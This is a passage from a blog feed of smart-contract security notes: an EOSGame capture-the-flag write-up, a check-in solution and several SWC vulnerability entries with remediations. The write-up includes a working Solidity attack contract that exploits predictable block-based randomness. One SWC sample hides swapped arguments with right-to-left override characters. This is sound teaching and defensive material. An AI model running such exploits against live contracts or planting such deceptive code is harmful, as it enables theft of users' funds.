class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bet(uint256 chip) internal &#123;</span><br><span class="line">        bet_count[tx.origin] = bet_count[tx.origin].add(1);</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        if (shark == lucky)&#123;</span><br><span class="line">            eos.transfer(address(this), tx.origin, chip.mul(POWER));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function smallBlind() public &#123;</span><br><span class="line">        eos.transfer(tx.origin, address(this), SMALL_CHIP);</span><br><span class="line">        bet(SMALL_CHIP);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bigBlind() public &#123;</span><br><span class="line">        eos.transfer(tx.origin, address(this), BIG_CHIP);</span><br><span class="line">        bet(BIG_CHIP);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function eosBlanceOf() public view returns(uint256) &#123;</span><br><span class="line">        return eos.eosOf(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function CaptureTheFlag(string b64email) public&#123;</span><br><span class="line">        require (eos.eosOf(tx.origin) &gt; 18888);</span><br><span class="line">        emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>this level is a number guessing game, but the number is a pseudo random number since there is no unknown information on-chain. Let’s analyses the code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function bet(uint256 chip) internal &#123;</span><br><span class="line">       bet_count[tx.origin] = bet_count[tx.origin].add(1);</span><br><span class="line">       uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">       uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">       uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">       uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));</span><br><span class="line">       uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">       if (shark == lucky)&#123;</span><br><span class="line">           eos.transfer(address(this), tx.origin, chip.mul(POWER));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>From the <code>bet()</code> we see that <em>shark</em> is unchanging, it is decided on <code>block.number</code> and <code>block.timestamp</code>, so we can guess many times in a tx.</li><li>We can imitate the guessing rules to obtain random numbers. Because our guess and EOSGame guess are located on the same tx, their block information is same.</li><li><em>lucky_hash</em> will not change unless the <code>bet_count[tx.origin]</code> change, this means we should guess once in a tx or our guessing number will not change. In this case, I will call bigBlind if the guessing number is not right or I will call smallBlind(). Attention, maybe the tx will out of gas because we are not lucky enough to guess. Guessing wrong, it minus us 1 eosToken, but guessing right, we will get 20 * 100 -20 = 1980 eos token, it means we should guess right at least 10 times. </li></ul><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.24;</span><br><span class="line">import &quot;./02.EOSGame.sol&quot;;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line">contract EOSGameAttack &#123;</span><br><span class="line">    EOSGame game;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    uint256 MOD_NUM = 20;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr)&#123;</span><br><span class="line">      game = EOSGame(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">      while(true)&#123;</span><br><span class="line">        uint tmp = game.bet_count(tx.origin).add(1);</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(tmp)));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        if (shark == lucky)&#123;</span><br><span class="line">          console.log(&quot;第&quot;,tmp,&quot;次猜测,&quot;,&quot;成功，执行bigBlind()&quot;);</span><br><span class="line">          game.bigBlind();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          console.log(&quot;第&quot;,tmp,&quot;次猜测,&quot;,&quot;没猜中&quot;);</span><br><span class="line">          game.smallBlind();</span><br><span class="line">        &#125;</span><br><span class="line">        if(game.eosBlanceOf() &gt; 18888)&#123;</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>not lucky enought :( but our eosToken will not be minus,so we can guess again for the atomic transactions.</p><p><img src="https://moe.photo/images/2023/05/21/image-20230521140111235.png" alt="https://moe.photo/images/2023/05/21/image-20230521140111235.png"></p><p>lucky enough :)</p><p><img src="https://moe.photo/images/2023/05/21/image-20230521140056825.png" alt="https://moe.photo/images/2023/05/21/image-20230521140056825.png"></p>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.check-in @Greeter</title>
      <link href="/2023/07/13/02.ChainflagCTF/01.check-in%20@Greeter/"/>
      <url>/2023/07/13/02.ChainflagCTF/01.check-in%20@Greeter/</url>
      
        <content type="html"><![CDATA[<h1 id="check-in-Greeter"><a href="#check-in-Greeter" class="headerlink" title="check-in(Greeter)"></a>check-in(Greeter)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;HelloChainFlag&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>To make <code>isSolved()</code> returns true, we should modify greeting to “HelloChainFlag”. So we call <code>setGreeting()</code> with “HelloChainFlag” and then it will be solved.</p>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>30.SWC-130_Get Private Info</title>
      <link href="/2023/07/13/09.SWC/30.SWC-130_Get%20Private%20Info/"/>
      <url>/2023/07/13/09.SWC/30.SWC-130_Get%20Private%20Info/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-130-Get-Private-Info"><a href="#SWC-130-Get-Private-Info" class="headerlink" title="SWC-130_Get Private Info"></a>SWC-130_Get Private Info</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * @source: https://youtu.be/P_Mtd5Fc_3E</span><br><span class="line"> * @author: Shahar Zini</span><br><span class="line"> */</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumber</span><br><span class="line">&#123;</span><br><span class="line">    uint _secretNumber;</span><br><span class="line">    address payable _owner;</span><br><span class="line">    event success(string);</span><br><span class="line">    event wrongNumber(string);</span><br><span class="line">    </span><br><span class="line">    constructor(uint secretNumber) payable public</span><br><span class="line">    &#123;</span><br><span class="line">        require(secretNumber &lt;= 10);</span><br><span class="line">        _secretNumber = secretNumber;</span><br><span class="line">        _owner = msg.sender;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getValue() view public returns (uint)</span><br><span class="line">    &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint n) payable public</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        uint p = address(this).balance;</span><br><span class="line">        checkAndTransferPrize(/*The prize‮/*rebmun desseug*/n , p/*‭</span><br><span class="line">                /*The user who should benefit */,msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function checkAndTransferPrize(uint p, uint n, address payable guesser) internal returns(bool)</span><br><span class="line">    &#123;</span><br><span class="line">        if(n == _secretNumber) /*_secretNumber can be seen*/</span><br><span class="line">        &#123;</span><br><span class="line">            guesser.transfer(p);</span><br><span class="line">            emit success(&quot;You guessed the correct number!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            emit wrongNumber(&quot;You&#x27;ve made an incorrect guess!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function kill() public</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender == _owner);</span><br><span class="line">        selfdestruct(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>36.SWC-136_Get Private Info</title>
      <link href="/2023/07/13/09.SWC/36.SWC-136_Get%20Private%20Info/"/>
      <url>/2023/07/13/09.SWC/36.SWC-136_Get%20Private%20Info/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-136-Get-Private-Info"><a href="#SWC-136-Get-Private-Info" class="headerlink" title="SWC-136_Get Private Info"></a>SWC-136_Get Private Info</h1><p><a href="https://swcregistry.io/docs/SWC-136">SWC-136</a></p><p>Everyone can see player’s number in this contract: <code>Player.number</code></p><p>we can wait the first person to set number, and then we choose an appropriate number and set the number to get money .</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract OddEven &#123;</span><br><span class="line">    struct Player &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        uint number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Player[2] private players;</span><br><span class="line">    uint count = 0;</span><br><span class="line"></span><br><span class="line">    function play(uint number) public payable &#123;</span><br><span class="line">            require(msg.value == 1 ether, &#x27;msg.value must be 1 eth&#x27;);</span><br><span class="line">            players[count] = Player(msg.sender, number);</span><br><span class="line">            count++;</span><br><span class="line">            if (count == 2) selectWinner();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function selectWinner() private &#123;</span><br><span class="line">            uint n = players[0].number + players[1].number;</span><br><span class="line">            (bool success, ) = players[n%2].addr.call.value(address(this).balance)(&quot;&quot;);</span><br><span class="line">            require(success, &#x27;transfer failed&#x27;);</span><br><span class="line">            delete players;</span><br><span class="line">            count = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Remediation: </p><ol><li>Player chooses a number and blindingFactor, then calculate <code>keccak256(abi.encodePacked(msg.sender, number, blindingFactor)</code>. It results the commitment, while no one know your blindingFactor and number</li><li>play(): locking 2 players.</li><li>reveal(): you can only set the number you chose before, or you can not pass the <code>require()</code>. It prevents from players peep at others’ number because player encrypted his number by asymmetric encryption and he can not change this number for the <code>require()</code>.</li></ol><p>So if you want to hide something on the chain, maybe you can try asymmetric encryption and lock it by <code>require()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract OddEven &#123;</span><br><span class="line">    enum Stage &#123;</span><br><span class="line">        FirstCommit,</span><br><span class="line">        SecondCommit,</span><br><span class="line">        FirstReveal,</span><br><span class="line">        SecondReveal,</span><br><span class="line">        Distribution</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Player &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        bytes32 commitment;</span><br><span class="line">        uint number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Player[2] private players;</span><br><span class="line">    Stage public stage = Stage.FirstCommit;</span><br><span class="line"></span><br><span class="line">    function play(bytes32 commitment) public payable &#123;</span><br><span class="line">        // Only run during commit stages</span><br><span class="line">        uint playerIndex;</span><br><span class="line">        if(stage == Stage.FirstCommit) playerIndex = 0;</span><br><span class="line">        else if(stage == Stage.SecondCommit) playerIndex = 1;</span><br><span class="line">        else revert(&quot;only two players allowed&quot;);</span><br><span class="line"></span><br><span class="line">        // Require proper amount deposited</span><br><span class="line">        // 1 ETH as a bet + 1 ETH as a bond</span><br><span class="line">        require(msg.value == 2 ether, &#x27;msg.value must be 2 eth&#x27;);</span><br><span class="line"></span><br><span class="line">        // Store the commitment</span><br><span class="line">        players[playerIndex] = Player(msg.sender, commitment, 0);</span><br><span class="line"></span><br><span class="line">        // Move to next stage</span><br><span class="line">        if(stage == Stage.FirstCommit) stage = Stage.SecondCommit;</span><br><span class="line">        else stage = Stage.FirstReveal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function reveal(uint number, bytes32 blindingFactor) public &#123;</span><br><span class="line">        // Only run during reveal stages</span><br><span class="line">        require(stage == Stage.FirstReveal || stage == Stage.SecondReveal, &quot;wrong stage&quot;);</span><br><span class="line"></span><br><span class="line">        // Find the player index</span><br><span class="line">        uint playerIndex;</span><br><span class="line">        if(players[0].addr == msg.sender) playerIndex = 0;</span><br><span class="line">        else if(players[1].addr == msg.sender) playerIndex = 1;</span><br><span class="line">        else revert(&quot;unknown player&quot;);</span><br><span class="line"></span><br><span class="line">        // Check the hash to prove the player&#x27;s honesty</span><br><span class="line">        require(keccak256(abi.encodePacked(msg.sender, number, blindingFactor)) == players[playerIndex].commitment, &quot;invalid hash&quot;);</span><br><span class="line"></span><br><span class="line">        // Update player number if correct</span><br><span class="line">        players[playerIndex].number = number;</span><br><span class="line"></span><br><span class="line">        // Move to next stage</span><br><span class="line">        if(stage == Stage.FirstReveal) stage = Stage.SecondReveal;</span><br><span class="line">        else stage = Stage.Distribution;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function distribute() public &#123;</span><br><span class="line">        // Only run during distribution stage</span><br><span class="line">        require(stage == Stage.Distribution, &quot;wrong stage&quot;);</span><br><span class="line"></span><br><span class="line">        // Find winner</span><br><span class="line">        uint n = players[0].number + players[1].number;</span><br><span class="line"></span><br><span class="line">        // Payout winners winnings and bond</span><br><span class="line">        players[n%2].addr.call.value(3 ether)(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        // Payback losers bond</span><br><span class="line">        players[(n+1)%2].addr.call.value(1 ether)(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        // Reset the state</span><br><span class="line">        delete players;</span><br><span class="line">        stage = Stage.FirstCommit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>35.SWC-135_checkExecution</title>
      <link href="/2023/07/13/09.SWC/35.SWC-135_checkExecution/"/>
      <url>/2023/07/13/09.SWC/35.SWC-135_checkExecution/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-135-useless-statement"><a href="#SWC-135-useless-statement" class="headerlink" title="SWC-135_useless statement"></a>SWC-135_useless statement</h1><p><a href="https://swcregistry.io/docs/SWC-135#deposit-boxsol">link</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract DepositBox &#123;</span><br><span class="line">    mapping(address =&gt; uint) balance;</span><br><span class="line"></span><br><span class="line">    // Accept deposit</span><br><span class="line">    function deposit(uint amount) public payable &#123;</span><br><span class="line">        require(msg.value == amount, &#x27;incorrect amount&#x27;);</span><br><span class="line">        // Should update user balance</span><br><span class="line">        // balance[msg.sender] == amount;</span><br><span class="line">        // fixed</span><br><span class="line">        balance[msg.sender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    mapping(address =&gt; uint) balance;</span><br><span class="line"></span><br><span class="line">    // Deposit funds in contract</span><br><span class="line">    function deposit(uint amount) public payable &#123;</span><br><span class="line">        require(msg.value == amount, &#x27;msg.value must be equal to amount&#x27;);</span><br><span class="line">        balance[msg.sender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Withdraw funds from contract</span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(amount &lt;= balance[msg.sender], &#x27;amount must be less than balance&#x27;);</span><br><span class="line"></span><br><span class="line">        uint previousBalance = balance[msg.sender];</span><br><span class="line">        balance[msg.sender] = previousBalance - amount;</span><br><span class="line"></span><br><span class="line">        // Attempt to send amount from the contract to msg.sender</span><br><span class="line">        // msg.sender.call.value(amount);</span><br><span class="line">        // fixed: </span><br><span class="line">        (bool success, ) = msg.sender.call.value(amount)(&quot;&quot;);</span><br><span class="line">        require(success, &#x27;transfer failed&#x27;);</span><br><span class="line">        // issues#7096,#2707</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We should prevent useless code in contract and ensure the code will produce the intended effects.</p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>34.SWC-134_hardcoded gas amount</title>
      <link href="/2023/07/13/09.SWC/34.SWC-134_hardcoded%20gas%20amount/"/>
      <url>/2023/07/13/09.SWC/34.SWC-134_hardcoded%20gas%20amount/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-134-hardcoded-gas-amount"><a href="#SWC-134-hardcoded-gas-amount" class="headerlink" title="SWC-134_hardcoded gas amount"></a>SWC-134_hardcoded gas amount</h1><p>The <code>transfer()</code> and <code>send()</code> functions forward a fixed amount of 2300 gas. Historically, it has often been recommended to use these functions for value transfers to guard against reentrancy attacks. However, the gas cost of EVM instructions may change significantly during hard forks which may break already deployed contract systems that make fixed assumptions about gas costs. For example. <a href="https://eips.ethereum.org/EIPS/eip-1884">EIP 1884</a> broke several existing smart contracts due to a cost increase of the SLOAD instruction.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.6.4;</span><br><span class="line"></span><br><span class="line">interface ICallable &#123;</span><br><span class="line">    function callMe() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HardcodedNotGood &#123;</span><br><span class="line"></span><br><span class="line">    address payable _callable = 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa;</span><br><span class="line">    ICallable callable = ICallable(_callable);</span><br><span class="line"></span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doTransfer(uint256 amount) public &#123;</span><br><span class="line">        _callable.transfer(amount);</span><br><span class="line">    &#125;//2300 gas limited</span><br><span class="line"></span><br><span class="line">    function doSend(uint256 amount) public &#123;</span><br><span class="line">        _callable.send(amount);</span><br><span class="line">    &#125;//2300 gas limited</span><br><span class="line"></span><br><span class="line">     function callLowLevel() public &#123;</span><br><span class="line">         _callable.call.value(0).gas(10000)(&quot;&quot;);</span><br><span class="line">     &#125;//hardcoded gas amount</span><br><span class="line"></span><br><span class="line">     function callWithArgs() public &#123;</span><br><span class="line">         callable.callMe&#123;gas: 10000&#125;();</span><br><span class="line">     &#125;//hardcoded gas amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>remediation: avoid the use of <code>transfer()</code> and <code>send()</code> and do not otherwise specify a fixed amount of gas when performing calls. Use <code>.call.value(...)(&quot;&quot;)</code> instead. Use the checks-effects-interactions pattern and/or reentrancy locks to prevent reentrancy attacks.</p><h2 id="stop-using-transfer"><a href="#stop-using-transfer" class="headerlink" title="stop using transfer()"></a>stop using transfer()</h2><p><a href="https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/">link</a></p><p>It looks like EIP 1884 is headed our way in the Istanbul hard fork. This change increases the gas cost of the <code>SLOAD</code> operation and therefore breaks some existing smart contracts.</p><p>Those contracts will break because their fallback functions used to consume less than 2300 gas, and they’ll now consume more. Why is 2300 gas significant? It’s the amount of gas a contract’s fallback function receives if it’s called via <a href="https://solidity.readthedocs.io/en/v0.5.11/units-and-global-variables.html#members-of-address-types">Solidity’s <code>transfer()</code> or <code>send()</code> methods</a>. <a href="https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/#fn:1">1</a></p><p>Since its introduction, <code>transfer()</code> has typically been recommended by the security community because it helps guard against reentrancy attacks. This guidance made sense under the assumption that gas costs wouldn’t change, but that assumption turned out to be incorrect. We now recommend that <code>transfer()</code> and <code>send()</code> be avoided.</p><h3 id="Gas-Costs-Can-and-Will-Change"><a href="#Gas-Costs-Can-and-Will-Change" class="headerlink" title="Gas Costs Can and Will Change"></a>Gas Costs Can and Will Change</h3><p>Each opcode supported by the EVM has an associated gas cost. For example, <code>SLOAD</code>, which reads a word from storage, currently—but not for long—costs 200 gas. The gas costs aren’t arbitrary. They’re meant to reflect the underlying resources consumed by each operation on the nodes that make up Ethereum.</p><h3 id="Smart-Contracts-Can’t-Depend-on-Gas-Costs"><a href="#Smart-Contracts-Can’t-Depend-on-Gas-Costs" class="headerlink" title="Smart Contracts Can’t Depend on Gas Costs"></a>Smart Contracts Can’t Depend on Gas Costs</h3><p>If gas costs are subject to change, then smart contracts can’t depend on any particular gas costs.</p><p>Any smart contract that uses <code>transfer()</code> or <code>send()</code> is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300.</p><p>Our recommendation is to stop using <code>transfer()</code> and <code>send()</code> in your code and switch to using <code>call()</code> instead:</p><figure class="highlight 